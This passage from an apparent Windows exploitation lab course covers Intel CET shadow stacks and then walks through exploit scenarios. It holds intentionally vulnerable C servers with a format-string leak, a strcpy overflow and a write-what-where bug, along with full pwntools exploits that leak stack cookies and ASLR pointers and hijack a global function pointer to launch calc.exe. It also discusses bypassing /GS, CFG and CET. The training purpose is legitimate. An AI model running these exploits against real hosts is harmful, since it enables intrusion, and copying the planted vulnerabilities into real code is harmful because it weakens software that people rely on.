  2. Pushes return address to shadow stack

RET instruction:
  1. Pops return address from normal stack
  2. Pops return address from shadow stack (SSP)
  3. If they don't match -> #CP (Control Protection) exception
  4. Process terminated
```

#### CET Instructions

```asm
; New instructions for shadow stack

INCSSP reg    ; Increment shadow stack pointer (adjust SSP)
RDSSP  reg    ; Read shadow stack pointer into register
SAVEPREVSSP   ; Save previous SSP (for context switches)
RSTORSSP mem  ; Restore SSP from memory
WRSS   mem,reg; Write to shadow stack (privileged/restricted)
WRUSS  mem,reg; Write to user shadow stack (ring 3, restricted)

; These are highly restricted - user code can't freely modify shadow stack
```

#### CET-Aware Code

```c
// Check if CET is enabled
#include <intrin.h>

BOOL IsCETEnabled() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 7);

    // CET_SS (Shadow Stack) is bit 7 of ECX from CPUID leaf 7
    return (cpuInfo[2] & (1 << 7)) != 0;
}

// Check process CET status
#include <windows.h>

BOOL IsProcessCETEnabled() {
    PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY policy = {0};

    if (GetProcessMitigationPolicy(
            GetCurrentProcess(),
            ProcessUserShadowStackPolicy,
            &policy,
            sizeof(policy))) {
        return policy.EnableUserShadowStack;
    }
    return FALSE;
}
```

**Enabling CET for Your Process**:

```c
// Enable CET at process creation
STARTUPINFOEX si = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T size = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_ON;
UpdateProcThreadAttribute(
    si.lpAttributeList,
    0,
    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
    &policy,
    sizeof(policy),
    NULL,
    NULL
);

CreateProcess(..., &si, ...);
```

#### CET Bypass Considerations

```text
With CET Shadow Stack, classic ROP is BLOCKED (not just harder):

- Return address overwrite -> shadow stack mismatch -> process terminated
- Classic ROP chains are impossible (every RET is validated)
- __fastfail triggers STATUS_BREAKPOINT (0x80000003) via int 0x29
- No user-mode recovery — kernel kills the process immediately

What still works (proven in Techniques 1-4 above):
+ Struct-based function pointer overwrites (indirect CALL, not RET)
+ Data-only attacks (corrupt security flags, not code pointers)
+ Exception-based bypasses (skip cookie check via __except)
+ JOP (Jump-Oriented Programming) — doesn't use RET
+ COP (Call-Oriented Programming) — uses CALL, not RET

What does NOT help against data-only attacks:
- CET shadow stack (only protects RET, not indirect CALL)
- CFG coarse-grained check (allows redirect between valid functions)
- /GS cookies (struct members aren't reordered)
```

**CET + IBT (Indirect Branch Tracking)**:

```text
Full CET includes IBT (Indirect Branch Tracking):
- Indirect CALL/JMP must land on ENDBR64 instruction
- Prevents arbitrary indirect jumps to mid-function locations
- Further restricts JOP/COP attacks

ENDBR64 instruction:
- Marks valid indirect branch targets
- Compiler inserts at function entries
- Gadgets that don't start with ENDBR64 are invalid

Windows IBT status:
- Windows 11 supports CET shadow stacks (User Shadow Stacks)
- IBT enforcement is not yet widely enabled on Windows userspace
- Linux has enabled IBT on kernel (since 5.18) and can enforce on userspace
- When IBT is enabled, it provides similar protection to CFG for indirect calls
  but at the hardware level with ENDBR64 validation
```

### Exploitation Scenarios

#### Scenario 1: Multi-Stage Cookie Leak and Data-Only Attack

Exploit chain for a vulnerable server. This demonstrates the
full attack flow: format string leak -> identify cookie/pointers -> exploit.

**Vulnerable Server (Full Example)**:

```c
// realworld_server.c - More realistic vulnerable server
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 31337
#define MAX_CLIENTS 10

typedef struct {
    char username[64];
    char session_token[32];
    int privilege_level;
} Session;

typedef struct {
    char command[16];
    char args[128];
    char padding[64];
} Request;

// Global session storage
Session* active_sessions[MAX_CLIENTS];

// Log function with format string vulnerability
// BUG: sends formatted output back to client, leaking stack values
void log_message(SOCKET client, const char* format, ...) {
    char buffer[512];
    va_list args;
    va_start(args, format);
    _vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    buffer[sizeof(buffer) - 1] = '\0';
    printf("[LOG] %s\n", buffer);
    // BUG: sends raw formatted output to client (attacker sees leaked values!)
    send(client, buffer, (int)strlen(buffer), 0);
    send(client, "\n", 1, 0);
}

// Vulnerable: Format string in logging
void handle_login(SOCKET client, char* data) {
    char response[256];
    char username[64];

    // Parse username for display
    strncpy(username, data, 63);
    username[63] = '\0';

    // VULNERABILITY: Format string leak — attacker-controlled format!
    // Uses raw 'data' (up to ~500 bytes from recv_buffer), NOT truncated
    // username. This gives the attacker enough room for many %p specifiers
    // to reach return addresses and code pointers deep in the stack.
    // With username[64], only ~21 specifiers fit — not enough.
    // With raw data (~500 bytes), ~166 specifiers fit — reaches everything.
    log_message(client, data);  // Leaks stack values to attacker!

    // Send response (uses safe truncated copy)
    _snprintf(response, sizeof(response),
             "Login attempt for: %s\n", username);
    response[sizeof(response) - 1] = '\0';
    send(client, response, (int)strlen(response), 0);
}

// Vulnerable: Stack buffer overflow
void handle_execute(SOCKET client, Request* req) {
    char local_buffer[64];  // Small buffer
    char response[256];

    // VULNERABILITY: Copies 128-byte args into 64-byte buffer
    strcpy(local_buffer, req->args);  // OVERFLOW!

    // Process and respond
    snprintf(response, sizeof(response),
             "Executed: %s with args: %s\n",
             req->command, local_buffer);
    send(client, response, strlen(response), 0);
}

void handle_client(SOCKET client) {
    char recv_buffer[512];
    int bytes;
    Request req = {0};

    // Receive command
    bytes = recv(client, recv_buffer, sizeof(recv_buffer) - 1, 0);
    if (bytes <= 0) return;
    recv_buffer[bytes] = '\0';

    // Parse request
    if (strncmp(recv_buffer, "LOGIN ", 6) == 0) {
        handle_login(client, recv_buffer + 6);
    }
    else if (strncmp(recv_buffer, "EXEC ", 5) == 0) {
        // Parse EXEC command
        char* space = strchr(recv_buffer + 5, ' ');
        if (space) {
            *space = '\0';
            strncpy(req.command, recv_buffer + 5, 15);
            strncpy(req.args, space + 1, 127);
            handle_execute(client, &req);
        }
    }
    else {
        send(client, "Unknown command\n", 16, 0);
    }
}

int main() {
    WSADATA wsa;
    SOCKET server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    int client_len = sizeof(client_addr);

    WSAStartup(MAKEWORD(2, 2), &wsa);

    server_sock = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_sock, MAX_CLIENTS);

    printf("[*] Server listening on port %d\n", PORT);
    printf("[*] log_message     @ %p\n", (void*)log_message);
    printf("[*] handle_login    @ %p\n", (void*)handle_login);
    printf("[*] handle_execute  @ %p\n", (void*)handle_execute);
    printf("[*] Mitigations: /GS enabled, ASLR enabled\n");
    fflush(stdout);

    while(1) {
        client_sock = accept(server_sock,
                            (struct sockaddr*)&client_addr,
                            &client_len);
        printf("[+] Client connected\n");
        handle_client(client_sock);
        closesocket(client_sock);
        printf("[-] Client disconnected\n");
    }

    return 0;
}
```

**Pwntools Exploit**:

```python
#!/usr/bin/env python3
"""
Full Exploit: Stack Cookie Bypass via Information Leak
Target: realworld_server.exe
Chain: Format String Leak -> Cookie/ASLR Bypass -> Struct Function Pointer Attack

This demonstrates a complete exploitation workflow.

IMPORTANT:
  - MSVCRT does NOT support positional format strings (%N$x).
    We use sequential %p specifiers instead.
  - MSVCRT %p prints bare hex (e.g., 000000000014FA48), not 0x-prefixed.
  - On CET-enabled systems, the ROP chain in Stage 3 is BLOCKED.
    Use data-only / struct-based attacks (Techniques 1-4) instead.
"""

from pwn import *
import re
import sys

# ================== Configuration ==================
TARGET_HOST = "127.0.0.1"  # Change to target
TARGET_PORT = 31337

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'

# ================== Helper Functions ==================

def connect():
    """Establish connection to target"""
    return remote(TARGET_HOST, TARGET_PORT)

def leak_stack_values(num_pads):
    """
    Use format string to leak stack values.
    MSVCRT doesn't support positional %N$p — we must use sequential %p.
    MSVCRT %p prints bare hex without 0x prefix.
    """
    r = connect()

    # Build format string with sequential %p specifiers
    # Each %p leaks one pointer-sized value from the stack
    payload = b"LOGIN " + b"%p." * num_pads
    r.send(payload)

    try:
        response = r.recvuntil(b"Login attempt", timeout=3)
    except:
        response = r.recv(timeout=2)

    r.close()

    # Parse bare-hex values from response (MSVCRT format: 000000000014FA48)
    # Also handle 0x-prefixed and (null) / 0000000000000000
    values = re.findall(rb'([0-9A-Fa-f]{8,16})', response)
    leaks = {}
    for i, val_bytes in enumerate(values):
        try:
            val = int(val_bytes, 16)
            leaks[i] = val
            log.debug(f"Offset {i}: 0x{val:016X}")
        except ValueError:
            pass

    return leaks

def identify_values(leaks):
    """
    Analyze leaked values to identify:
    - Stack cookie (XOR'd with RBP — high entropy, not a valid address)
    - Code pointers (in image range, e.g., 0x140XXXXXX with /FIXED)
    - Stack addresses (user-mode VA range)
    """
    identified = {
        'cookie': None,
        'code_ptrs': [],
        'stack_ptrs': []
    }

    for offset, val in leaks.items():
        if val == 0:
            continue

        # Image base pointers (with /FIXED, typically 0x140XXXXXX)
        if 0x140000000 <= val <= 0x14FFFFFFF:
            identified['code_ptrs'].append((offset, val))
            log.info(f"Code pointer at offset {offset}: 0x{val:016X}")

        # With ASLR: code pointers in 0x7ff6-0x7fff range
        elif 0x7ff600000000 <= val <= 0x7fffffffffff:
            identified['code_ptrs'].append((offset, val))
            log.info(f"ASLR code pointer at offset {offset}: 0x{val:016X}")

        # Stack addresses: typically high user-mode VA
        elif 0x0000000100000 <= val <= 0x00007fffffffffff and \
             not (0x7ff000000000 <= val <= 0x7fffffffffff) and \
             not (0x140000000 <= val <= 0x14FFFFFFF):
            identified['stack_ptrs'].append((offset, val))
            log.debug(f"Stack pointer at offset {offset}: 0x{val:016X}")

        # Cookie candidate: high entropy, not a valid address
        # The XOR'd cookie typically doesn't look like any address range
        elif val > 0xFFFF:
            if identified['cookie'] is None:
                identified['cookie'] = (offset, val)
                log.success(f"Potential cookie at offset {offset}: 0x{val:016X}")

    return identified

def exploit():
    """Main exploitation function"""

    log.info("=" * 50)
    log.info("Stack Cookie Bypass — Information Leak")
    log.info("=" * 50)

    # ============ Stage 1: Information Leak ============
    log.info("Stage 1: Leaking stack values via format string")
    log.info("Using sequential %%p (MSVCRT has no positional %%N$p)")

    leaks = leak_stack_values(80)  # Leak 80 stack values (needs raw data path)
    log.info(f"Leaked {len(leaks)} values from stack")

    identified = identify_values(leaks)

    if identified['cookie'] is None:
        log.error("Failed to identify stack cookie!")
        return False

    cookie_offset, cookie_value = identified['cookie']
    log.success(f"Cookie: 0x{cookie_value:016X} at offset {cookie_offset}")

    if identified['code_ptrs']:
        code_offset, code_ptr = identified['code_ptrs'][0]
        log.success(f"Code pointer: 0x{code_ptr:016X} at offset {code_offset}")
        # With ASLR, calculate base address:
        # The leaked pointer is somewhere inside the binary.
        # Page-align down to estimate the module base.
        # In a real exploit, you'd know the exact offset from RE.
        estimated_base = code_ptr & 0xFFFFFFFFFFFF0000  # 64KB aligned (ASLR granularity)
        log.info(f"Estimated module base: 0x{estimated_base:016X}")
        log.info(f"Offset in module: 0x{code_ptr - estimated_base:X}")
    else:
        log.warning("No code pointers leaked — try increasing num_pads")

    # ============ Stage 2: Exploitation ============
    log.info("Stage 2: Exploitation")
    log.info("")
    log.warning("=" * 50)
    log.warning("CET CHECK: On Windows 11 with CET shadow stacks,")
    log.warning("classic ROP (return address overwrite) is BLOCKED.")
    log.warning("The shadow stack maintains a separate copy of return")
    log.warning("addresses that the attacker cannot modify.")
    log.warning("")
    log.warning("For CET-enabled targets, use data-only attacks:")
    log.warning("  - Struct function pointer overwrite (Techniques 1-3)")
    log.warning("  - Exception-based data corruption (Technique 4)")
    log.warning("  - Write-What-Where to global function pointers")
    log.warning("=" * 50)

    # --- Conceptual ROP chain (for non-CET systems only) ---
    # On systems WITHOUT CET, the cookie leak enables classic ROP:
    #
    # handle_execute stack layout (approximate):
    # [local_buffer 64][cookie 8][saved_rbp 8][return_addr 8]
    #
    # payload = b"EXEC cmd "
    # payload += b"A" * 64                   # Fill local_buffer
    # payload += p64(cookie_value)            # Correct cookie!
    # payload += p64(0xdeadbeef)              # Saved RBP
    # payload += rop_chain                    # ROP chain at return
    #
    # But on CET: shadow stack mismatch -> process killed.

    log.success("Leak complete. Cookie and code pointers recovered.")
    log.info("On non-CET systems: build ROP chain with leaked cookie.")
    log.info("On CET systems: use struct-based attacks from Techniques 1-4.")

    return True

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_HOST = sys.argv[1]
    if len(sys.argv) > 2:
        TARGET_PORT = int(sys.argv[2])

    exploit()
```

```bash
# build inside C:\Windows_Mitigations_Lab
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\realworld_server.c /Fe:bin\realworld_server.exe /link ws2_32.lib /DEBUG /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA
# in one terminal:
.\bin\realworld_server.exe
# in another
python exploits\realworld.py
# TODO: complete the exploit using one of the methods explained earlier in this day
```

#### Scenario 2: Write-What-Where Without Cookie Corruption

Exploiting vulnerable write primitives that don't touch the cookie.

```c
// www_vuln.c - Write-What-Where vulnerability
// Demonstrates: binary protocol deserialization into struct with unvalidated
// fields, enabling arbitrary write to a global function pointer.
//
// The struct fields (index, value, target) are directly controlled by
// attacker input. process_write() does: *target = value (Write-What-Where).
// The stack cookie is NEVER corrupted — the write targets a GLOBAL pointer.
//
// Key difference from Techniques 1-3: those corrupt struct function pointers
// on the STACK. This corrupts a GLOBAL function pointer via an arbitrary
// write primitive. /GS protects neither.

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <stddef.h>

typedef struct {
    char name[32];       // offset 0  - attacker label/command
    int index;           // offset 32 - array index (fallback path)
    int value;           // offset 36 - WHAT to write (low 32 bits)
    int* target;         // offset 40 - WHERE to write (pointer)
} WriteRequest;          // total: 48 bytes

// Array of allowed values
int allowed_values[10] = {0};

void process_write(WriteRequest* req) {
    // VULNERABILITY: No validation of target pointer or value!
    // Attacker controls both WHAT and WHERE.
    if (req->target != NULL) {
        printf("[*] Writing value 0x%X to address %p\n",
               req->value, (void*)req->target);
        *req->target = req->value;  // Write-What-Where!
    } else {
        // Fallback: write to allowed_values array
        // VULNERABILITY: No bounds check on index!
        printf("[*] Writing value %d to allowed_values[%d]\n",
               req->value, req->index);
        allowed_values[req->index] = req->value;  // OOB write!
    }

    printf("[*] Write completed\n");
}

// Function pointer that will be our target
void (*cleanup_handler)(void) = NULL;

void safe_cleanup() {
    printf("[*] Safe cleanup running\n");
}

void dangerous_action() {
    printf("[!] PWNED! Running dangerous action!\n");
    system("calc.exe");
}

int main() {
    WriteRequest req = {0};
    size_t n;

    cleanup_handler = safe_cleanup;

    // Print addresses for exploit auto-parsing
    printf("=== Write-What-Where Demo ===\n");
    printf("safe_cleanup      @ %p\n", (void*)safe_cleanup);
    printf("dangerous_action  @ %p\n", (void*)dangerous_action);
    printf("cleanup_handler   @ %p (global func ptr)\n", (void*)&cleanup_handler);
    printf("cleanup_handler   = %p (currently points to safe_cleanup)\n",
           (void*)cleanup_handler);
    printf("struct size: %zu bytes\n", sizeof(WriteRequest));
    printf("  name[32]  @ offset %zu\n", offsetof(WriteRequest, name));
    printf("  index     @ offset %zu\n", offsetof(WriteRequest, index));
    printf("  value     @ offset %zu\n", offsetof(WriteRequest, value));
    printf("  target    @ offset %zu\n", offsetof(WriteRequest, target));
    fflush(stdout);

    // Read binary request (simulates a binary protocol/deserialization)
    // fread does NOT add \0 or stop at newline — reads exact binary data.
    // The attacker controls ALL struct fields: name, index, value, target.
    // No overflow past the struct = cookie is NOT corrupted.
    printf("\nWaiting for %zu bytes of binary input...\n", sizeof(req));
    fflush(stdout);
    n = fread(&req, 1, sizeof(req), stdin);
    printf("[*] Read %zu bytes\n", n);

    // Show what the attacker sent
    printf("[*] name:   '%.32s'\n", req.name);
    printf("[*] index:  %d\n", req.index);
    printf("[*] value:  0x%X\n", req.value);
    printf("[*] target: %p\n", (void*)req.target);
    fflush(stdout);

    process_write(&req);

    // Later... cleanup_handler has been overwritten!
    printf("[*] Calling cleanup_handler (%p)...\n",
           (void*)cleanup_handler);
    fflush(stdout);
    if (cleanup_handler) {
        cleanup_handler();  // Calls dangerous_action!
    }

    return 0;
}
```

**Compile**:

```bash
# Save to C:\Windows_Mitigations_Lab\src\www_vuln.c
# Compile with /GS to show that cookie doesn't protect this attack vector
# /FIXED = no ASLR (deterministic addresses for the exploit)
cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\www_vuln.c /Fe:bin\www_vuln.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

# This exploits a Write-What-Where primitive that bypasses stack cookies entirely
# The attack targets a global function pointer, not the return address
# Cookie is NEVER corrupted — fread reads exactly sizeof(struct) bytes
```

**Pwntools WWW Exploit**:

```python
#!/usr/bin/env python3
"""
exploits/sc_www.py
Write-What-Where Exploit — Bypasses /GS without corrupting the cookie!

The vulnerable C code uses fread(&req, 1, sizeof(req), stdin) to read
a binary request directly into a WriteRequest struct. The attacker
controls ALL struct fields, including the 'target' pointer and 'value'.

process_write() does: *target = value (Write-What-Where).
We set target = &cleanup_handler and value = low 32 bits of
dangerous_action's address. This overwrites the global function pointer.

struct WriteRequest layout (x64):
  +0x00: name[32]    (32 bytes)
  +0x20: index       (4 bytes, int)
  +0x24: value       (4 bytes, int)  <- WHAT to write
  +0x28: target      (8 bytes, ptr)  <- WHERE to write
  Total: 48 bytes

Key insight: fread reads EXACTLY sizeof(req) = 48 bytes. No \0 appended,
no \n handling. The data goes into the struct and NOWHERE ELSE.
The stack cookie (placed after the struct) is never touched.

With /FIXED: all addresses share upper bytes (0x00000001). process_write
does a 4-byte int write, so overwriting just the low dword of
cleanup_handler is enough — upper bytes remain correct.

Addresses are auto-parsed from the binary's runtime output.

Works on Windows 11 + CET: no return address hijacking.
This is a global function pointer write, not a struct member attack.

Usage:
  python exploits\\sc_www.py
"""

from pwn import *
import re

context.arch = 'amd64'
context.os = 'windows'
context.log_level = 'info'


def parse_address(output_bytes, label):
    """
    Parse an address from binary output like:
      dangerous_action  @ 00000001400043C7
    Handles both bare-hex (MSVCRT) and 0x-prefixed formats.
    """
    patterns = [
        re.compile(label.encode() + rb'\s+@\s+([0-9A-Fa-f]{8,16})'),
        re.compile(label.encode() + rb'\s*=\s*([0-9A-Fa-f]{8,16})'),
        re.compile(label.encode() + rb'\s+@\s+0x([0-9A-Fa-f]+)'),
    ]
    for pat in patterns:
        m = pat.search(output_bytes)
        if m:
            return int(m.group(1), 16)
    return None


def exploit():
    binary_path = r'C:\Windows_Mitigations_Lab\bin\www_vuln.exe'

    # Phase 1: Run binary to discover addresses from startup output
    log.info("Phase 1: discovering addresses from binary output...")
    p = process([binary_path])

    # Binary prints addresses, then waits for binary input
    try:
        startup = p.recvuntil(b"binary input...", timeout=5)
    except:
        startup = p.recv(timeout=3)

    decoded = startup.decode(errors='replace')
    log.info(f"Startup output:\n{decoded}")

    # Parse addresses
    DANGEROUS_ACTION = parse_address(startup, 'dangerous_action')
    # cleanup_handler appears twice: "@ addr (global func ptr)" and "= addr (currently...)"
    # We want the ADDRESS OF the variable (the one with "global func ptr")
    m = re.search(rb'cleanup_handler\s+@\s+([0-9A-Fa-f]{8,16})\s+\(global', startup)
    if m:
        CLEANUP_HANDLER_PTR = int(m.group(1), 16)
    else:
        CLEANUP_HANDLER_PTR = parse_address(startup, 'cleanup_handler')

    if DANGEROUS_ACTION is None or CLEANUP_HANDLER_PTR is None:
        log.error("Failed to parse addresses from binary output!")
        log.error("Expected: 'dangerous_action  @ ADDR' and 'cleanup_handler   @ ADDR (global func ptr)'")
        p.close()
        return

    log.success(f"dangerous_action  = 0x{DANGEROUS_ACTION:016X}")
    log.success(f"cleanup_handler   @ 0x{CLEANUP_HANDLER_PTR:016X} (address of global variable)")

    # Phase 2: Build Write-What-Where payload
    log.info("Phase 2: building WWW payload...")

    # struct WriteRequest layout:
    #   name[32]  @ +0x00  (label/command string)
    #   index     @ +0x20  (4 bytes — not used when target is non-NULL)
    #   value     @ +0x24  (4 bytes — WHAT to write: low 32 bits of dangerous_action)
    #   target    @ +0x28  (8 bytes — WHERE to write: &cleanup_handler)
    #
    # process_write() does: *(int*)target = value
    # This overwrites the low 4 bytes of cleanup_handler.
    # Since both functions share upper bytes 0x00000001 (compiled with /FIXED),
    # the full 8-byte pointer now correctly points to dangerous_action.

    payload = b"calc.exe\x00"                                    # name (command for later)
    payload += b"A" * (32 - len(payload))                        # pad name to 32 bytes
    payload += p32(0)                                            # index (unused)
    payload += p32(DANGEROUS_ACTION & 0xFFFFFFFF)                # value: low 32 bits
    payload += p64(CLEANUP_HANDLER_PTR)                          # target: &cleanup_handler

    assert len(payload) == 48, f"Payload must be exactly 48 bytes, got {len(payload)}"

    log.info(f"Payload ({len(payload)} bytes):")
    log.info(f"  [0..31]   name: 'calc.exe' + padding")
    log.info(f"  [32..35]  index: 0 (unused — target is non-NULL)")
    log.info(f"  [36..39]  value: 0x{DANGEROUS_ACTION & 0xFFFFFFFF:08X} (low dword of dangerous_action)")
    log.info(f"  [40..47]  target: 0x{CLEANUP_HANDLER_PTR:016X} (&cleanup_handler)")

    # Send exactly 48 bytes — fread reads sizeof(req) = 48, no \n needed
    p.send(payload)

    try:
        output = p.recvall(timeout=5)
        decoded = output.decode(errors='replace')
        log.info(f"Output:\n{decoded}")

        if "PWNED" in decoded or "dangerous" in decoded.lower():
            log.success("Write-What-Where exploit worked!")
            log.success("cleanup_handler overwritten with dangerous_action")
            log.success("/GS cookie was NEVER corrupted — bypass complete")
        elif "Safe cleanup" in decoded:
            log.failure("cleanup_handler was NOT overwritten")
            log.failure("Check address parsing — compare with startup output")
    except:
        pass

    try:
        p.wait(timeout=5)
    except:
        pass

    if p.returncode is not None:
        exit_code = p.returncode & 0xFFFFFFFF
        if exit_code == 0:
            log.success(f"Clean exit (0x0) — cookie was never corrupted")
        elif exit_code == 0xc0000409:
            log.failure(f"Cookie corruption detected (0xc0000409)")
            log.failure("This should NOT happen with fread-based input")
        else:
            log.info(f"Exit code: {hex(exit_code)}")

    p.close()


if __name__ == "__main__":
    exploit()
```

**Expected Results**:

```bash
c:\Windows_Mitigations_Lab> python exploits\sc_www.py
#[*] Phase 1: discovering addresses from binary output...
#[x] Starting local process 'C:\\Windows_Mitigations_Lab\\bin\\www_vuln.exe'
#[+] Starting local process 'C:\\Windows_Mitigations_Lab\\bin\\www_vuln.exe': pid 10640
#[*] Startup output:
#    === Write-What-Where Demo ===
#    safe_cleanup      @ 00000001400020F4
#    dangerous_action  @ 0000000140001E33
#    cleanup_handler   @ 00000001400A4568 (global func ptr)
#    cleanup_handler   = 00000001400020F4 (currently points to safe_cleanup)
#    struct size: 48 bytes
#      name[32]  @ offset 0
#      index     @ offset 32
#      value     @ offset 36
#      target    @ offset 40

#    Waiting for 48 bytes of binary input...
#[+] dangerous_action  = 0x0000000140001E33
#[+] cleanup_handler   @ 0x00000001400A4568 (address of global variable)
#[*] Phase 2: building WWW payload...
#[*] Payload (48 bytes):
#[*]   [0..31]   name: 'calc.exe' + padding
#[*]   [32..35]  index: 0 (unused — target is non-NULL)
#[*]   [36..39]  value: 0x40001E33 (low dword of dangerous_action)
#[*]   [40..47]  target: 0x00000001400A4568 (&cleanup_handler)
#[x] Receiving all data
#[x] Receiving all data: 2B
#[x] Receiving all data: 282B
#[*] Process 'C:\\Windows_Mitigations_Lab\\bin\\www_vuln.exe' stopped with exit code 0 (pid 10640)
#[+] Receiving all data: Done (282B)
#[*] Output:

#    [*] Read 48 bytes
#    [*] name:   'calc.exe'
#    [*] index:  0
#    [*] value:  0x40001E33
#    [*] target: 00000001400A4568
#    [*] Writing value 0x40001E33 to address 00000001400A4568
#    [*] Write completed
#    [*] Calling cleanup_handler (0000000140001E33)...
#   [!] PWNED! Running dangerous action!
#[+] Write-What-Where exploit worked!
#[+] cleanup_handler overwritten with dangerous_action
#[+] /GS cookie was NEVER corrupted — bypass complete
#[+] Clean exit (0x0) — cookie was never corrupted
```

### Practical Exercise

#### Task 1: Format String Leak — Cookie and ASLR Recovery

Demonstrate the full information leak chain against the ASLR-enabled server.

1. **Compile with ASLR** (addresses randomized every run):

   ```bash
   cd C:\Windows_Mitigations_Lab
   cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\realworld_server.c ^
      /Fe:bin\realworld_server.exe /link ws2_32.lib /DEBUG ^
      /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA
   ```

2. **Start the server** and note the function addresses printed at startup:

   ```bash
   bin\realworld_server.exe
   # Output:
   #   [*] Server listening on port 31337
   #   [*] log_message     @ 00007FF6799819C9    <- randomized!
   #   [*] handle_login    @ 00007FF679984133
   #   [*] handle_execute  @ 00007FF67998348B
   #   [*] Mitigations: /GS enabled, ASLR enabled
   ```

3. **Leak stack values** via format string (MSVCRT: sequential `%p`, bare hex, no `%N$p`):

   ```bash
   # 80 specifiers × ~17 chars each = ~1360 chars, but _vsnprintf buffer is 512.
   # Result: ~30 values leaked (512/17 ≈ 30). This is realistic — real leaks
   # are always constrained by buffer sizes.
   python -c "from pwn import *; r=remote('127.0.0.1',31337); r.send(b'LOGIN ' + b'%%p.' * 80); print(r.recv(timeout=3)); r.close()"
   ```

4. **Run the full exploit** to parse and classify leaked values:

   ```bash
   python exploits\realworld.py
   # Expected output:
   #   [+] Potential cookie at offset 1: 0x8101010101010100  <- high entropy
   #   [*] ASLR code pointer at offset 27: 0x00007FF939C0F77C <- DLL address
   #   [+] Cookie: 0x8101010101010100 at offset 1
   #   [+] Code pointer: 0x00007FF939C0F77C at offset 27
   #   [*] Estimated module base: 0x00007FF939C00000  (64KB aligned)
   ```

5. **Verify with WinDbg** — cross-check leaked values against actual stack:

   ```bash
   # Launch server under debugger
   windbg C:\Windows_Mitigations_Lab\bin\realworld_server.exe

   # Set breakpoint at the vulnerable function
   bp realworld_server!handle_login
   g
   # Server starts — connect with the format string payload from another terminal

   # When breakpoint hits, examine the stack:
   dqs rsp L30
   # Look for the cookie value (high-entropy, XOR'd with RSP)

   # Calculate expected cookie: global cookie XOR'd with RSP
   # IMPORTANT: poi() dereferences the symbol — without it, you get the ADDRESS
   ? poi(realworld_server!__security_cookie) ^ rsp
   # Result should match one of the leaked values

   # Find where code pointers appear on the stack:
   # Return addresses will be in the 0x00007FF6XXXXXXXX range (server module)
   # or 0x00007FFXXXXXXXXX range (system DLLs like ucrtbase, kernel32)
   dqs rsp L80
   # Match against the values your exploit reported
   ```

6. **Understand what was recovered**:

   | Item         | Example              | Exploit Use                                      |
   | ------------ | -------------------- | ------------------------------------------------ |
   | Stack cookie | `0x8101010101010100` | Place in overflow to pass `/GS` check (non-CET)  |
   | DLL code ptr | `0x00007FF939C0F77C` | Calculate DLL base -> find API addresses for ROP |
   | Server base  | Printed at startup   | Server module base for struct-based attacks      |

7. **On non-CET systems**: Build a ROP chain using the leaked cookie and code pointers
8. **On CET systems**: The cookie leak is still valuable for understanding the target, but use struct-based attacks (Techniques 1-4) for exploitation — CET shadow stack blocks ROP

#### Task 2: CFG Coarse-Grained Bypass — Prove It Empirically

Use the Technique 3 `--cfg-test` mode to observe CFG behavior directly.

1. **Compile all three variants** (no mitigation, /GS only, /GS + CFG):

   ```bash
   cd C:\Windows_Mitigations_Lab

   # Baseline: no /GS, no CFG
   cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
      /Fe:bin\func_ptr_overwrite.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

   # /GS only: prove struct members not reordered
   cl /GS /Zi /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
      /Fe:bin\func_ptr_overwrite_gs.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /DEBUG

   # /GS + CFG: observe coarse-grained check
   cl /GS /Zi /guard:cf /D_CRT_SECURE_NO_WARNINGS src\func_ptr_overwrite.c ^
      /Fe:bin\func_ptr_overwrite_cfg.exe /link /NXCOMPAT /DYNAMICBASE:NO /FIXED /guard:cf /DEBUG
   ```

2. **Run all three standard exploits** — all should pop calc:

   ```bash
   python exploits\sc_3_funcptr.py --exploit
   # All three builds: [DANGER] Executing: calc.exe
   # /GS doesn't help (struct members preserved)
   # CFG doesn't help (dangerous_handler is a valid function entry)
   ```

3. **Run the CFG coarse-grained test**:

   ```bash
   python exploits\sc_3_funcptr.py --cfg-test
   # TEST 1: Redirect to dangerous_handler (valid entry) -> CFG ALLOWS -> calc pops
   # TEST 2: Redirect to dangerous_handler+4 (mid-function)  -> CFG BLOCKS -> 0x80000003
   ```

4. **Analyze CFG validation in WinDbg**:

   ```bash
   # Launch CFG build under debugger

   # Break at the indirect call site (where handler is called)
   # First, find the call instruction in process_request:
   uf func_ptr_overwrite_cfg!process_request
   # Look for: call qword ptr [__guard_check_icall_fptr]
   #           call rax   (or similar indirect call pattern)

   # Set breakpoint at the CFG check:
   bp func_ptr_overwrite_cfg!process_request
   g
   # Feed the exploit payload from another terminal

   # Single-step through the CFG check:
   # The guard check validates RAX against the CFG bitmap.
   # If RAX = dangerous_handler (valid entry) -> check passes
   # If RAX = dangerous_handler+4 (mid-function) -> __fastfail

   # Watch the bitmap lookup:
   bp ntdll!LdrpValidateUserCallTarget
   g
   # When hit, examine:
